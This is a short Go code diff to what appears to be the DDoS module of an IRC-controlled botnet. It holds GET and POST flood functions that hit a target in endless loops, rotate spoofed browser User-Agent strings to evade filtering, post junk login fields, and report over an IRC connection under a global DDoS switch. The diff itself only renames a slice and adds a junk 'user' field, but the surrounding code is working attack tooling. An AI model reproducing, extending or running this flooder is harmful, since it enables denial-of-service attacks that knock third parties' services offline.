@@ -16,7 +16,7 @@ import (
 var DDoS_Switch bool
 
 func GET(getTarget, set_chan string, reportIRC net.Conn) {
-	agent_array := []string{
+	agent_slice := []string{
 		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
 		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
@@ -31,8 +31,8 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 	defer get_request.Body.Close()
 
 	for {
-		for i := range agent_array {
-			get_request.Header.Set("User-Agent", agent_array[i])
+		for i := range agent_slice {
+			get_request.Header.Set("User-Agent", agent_slice[i])
 			_get.Do(get_request)
 		}
 		if DDoS_Switch {
@@ -45,6 +45,7 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 	buffer := make([]byte, 50)
 	reqBody, _ := json.Marshal(map[string]string{
 		"email":    string(buffer),
+		"user":     string(buffer),
 		"password": string(buffer),
 	})
 	post_request, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
